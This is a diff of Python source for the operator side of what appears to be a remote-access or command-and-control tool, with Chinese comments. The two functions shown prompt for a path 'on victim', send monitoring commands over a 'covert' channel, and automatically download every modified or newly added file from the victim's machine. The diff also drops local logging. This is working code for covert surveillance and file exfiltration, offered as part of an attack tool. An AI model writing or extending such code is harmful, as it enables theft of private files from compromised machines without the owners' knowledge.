@@ -347,94 +347,78 @@ def cmd_get_file(comm: Commander):
 
 def cmd_monitor_file(comm: Commander):
     file_path = input("Enter file path on victim to monitor: ").strip()
-    date_str = datetime.now().strftime("%Y-%m-%d")
-    log_filename = f"{date_str}.log"
-    print(f"[DEBUG][Commander] Sending CMD_MON_FILE:{file_path}")
+    print(f"[Commander] 开始监控文件：{file_path}（仅在修改时触发下载）")
     comm.send_covert_message(f"CMD_MON_FILE:{file_path}".encode())
 
-    with open(log_filename, "a", encoding="utf-8") as logfile:
-        try:
-            while True:
-                data = comm.recv_covert_message()
-                if data is None:
-                    continue
+    try:
+        while True:
+            data = comm.recv_covert_message()
+            if not data:
+                continue  # 超时重试
 
-                # 先尝试 JSON 解析
+            # 只处理 JSON 事件
+            try:
+                msg = json.loads(data.decode('utf-8', errors='ignore'))
+            except Exception:
+                continue
+
+            typ  = msg.get('type', '')
+            path = msg.get('path', '')
+
+            # 只有真正的“文件修改”事件才下载
+            if typ == "MON_FILE_MODIFIED" and path:
+                print(f"[{msg.get('timestamp','')}] 文件被修改：{path}")
                 try:
-                    line = data.decode('utf-8', errors='ignore').strip()
-                    msg = json.loads(line)
-                except Exception:
-                    # 如果不是 JSON，就跳过（也可以处理 FILE_TRANSFER）
-                    continue
+                    local_name = os.path.basename(path)
+                    if not comm.download_file_with_debug(path, local_name):
+                        print(f"[!] 下载失败：{path}")
+                except Exception as e:
+                    print(f"[!] 下载异常：{e}")
 
-                ts   = msg.get('timestamp', '')
-                typ  = msg.get('type', '')
-                path = msg.get('path', '')
+    except KeyboardInterrupt:
+        print("\n[*] 停止文件监控。")
+        comm.send_covert_message(b"CMD_STOP_MON_FILE")
 
-                # 只对真正的“文件修改”事件触发下载
-                if typ == "MON_FILE_MODIFIED" and path:
-                    print(f"[{ts}] 文件被修改：{path}")
-                    # 下载到本地
-                    try:
-                        local_name = os.path.basename(path)
-                        ok = comm.download_file_with_debug(path, local_name)
-                        if not ok:
-                            print(f"[!] 下载失败：{path}")
-                    except Exception as e:
-                        print(f"[!] 下载异常：{e}")
-                # 记录日志
-                logfile.write(line + "\n")
-                logfile.flush()
-
-        except KeyboardInterrupt:
-            print("\n[*] 停止文件监控。")
-            comm.send_covert_message(b"CMD_STOP_MON_FILE")
 
 
 
 
 def cmd_monitor_dir(comm: Commander):
     dir_path = input("Enter directory path on victim to monitor: ").strip()
-    date_str = datetime.now().strftime("%Y-%m-%d")
-    log_filename = f"{date_str}.log"
-    print(f"[*] 开始监控目录：{dir_path}（仅根目录文件，不含子目录），日志：{log_filename}")
+    print(f"[Commander] 开始监控目录：{dir_path}（仅根目录文件，不含子目录；新增文件时下载）")
     comm.send_covert_message(f"CMD_MON_DIR:{dir_path}".encode())
 
-    with open(log_filename, "a", encoding="utf-8") as logfile:
-        try:
-            while True:
-                data = comm.recv_covert_message()
-                if data is None:
-                    continue
+    try:
+        while True:
+            data = comm.recv_covert_message()
+            if not data:
+                continue  # 超时重试
 
+            # 只处理 JSON 事件
+            try:
+                msg = json.loads(data.decode('utf-8', errors='ignore'))
+            except Exception:
+                continue
+
+            typ      = msg.get('type', '')
+            basepath = msg.get('path', '')
+            fname    = msg.get('filename', '')
+
+            # 只有新增文件时才下载
+            if typ == "MON_DIR_ADDED" and basepath and fname:
+                full_path = os.path.join(basepath, fname)
+                print(f"[{msg.get('timestamp','')}] 目录中新文件：{full_path}")
                 try:
-                    msg = json.loads(data.decode('utf-8', errors='ignore'))
-                except Exception:
-                    continue
+                    local_name = os.path.basename(full_path)
+                    if not comm.download_file_with_debug(full_path, local_name):
+                        print(f"[!] 下载失败：{full_path}")
+                except Exception as e:
+                    print(f"[!] 下载异常：{e}")
 
-                ts       = msg.get('timestamp', '')
-                typ      = msg.get('type', '')
-                basepath = msg.get('path', '')      # 目录路径
-                fname    = msg.get('filename', '')  # 新增或删除的文件名
+    except KeyboardInterrupt:
+        print("\n[*] 停止目录监控。")
+        comm.send_covert_message(b"CMD_STOP_MON_DIR")
 
-                # 只对“新增文件”事件触发下载
-                if typ == "MON_DIR_ADDED" and basepath and fname:
-                    full_path = os.path.join(basepath, fname)
-                    print(f"[{ts}] 目录中新文件：{full_path}")
-                    try:
-                        local_name = os.path.basename(full_path)
-                        ok = comm.download_file_with_debug(full_path, local_name)
-                        if not ok:
-                            print(f"[!] 下载失败：{full_path}")
-                    except Exception as e:
-                        print(f"[!] 下载异常：{e}")
-                # 记录日志
-                logfile.write(json.dumps(msg, ensure_ascii=False) + "\n")
-                logfile.flush()
-
-        except KeyboardInterrupt:
-            print("\n[*] 停止目录监控。")
-            comm.send_covert_message(b"CMD_STOP_MON_DIR")
 
 
 
